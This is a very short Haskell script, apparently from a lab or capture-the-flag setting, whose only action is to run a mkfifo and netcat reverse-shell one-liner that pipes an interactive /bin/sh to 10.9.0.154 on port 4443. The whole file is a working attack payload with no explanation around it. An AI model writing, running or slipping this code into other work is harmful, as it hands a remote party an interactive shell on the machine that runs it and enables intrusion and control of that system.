#!/usr/bin/runhaskhell
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.154 4443 >/tmp/f"
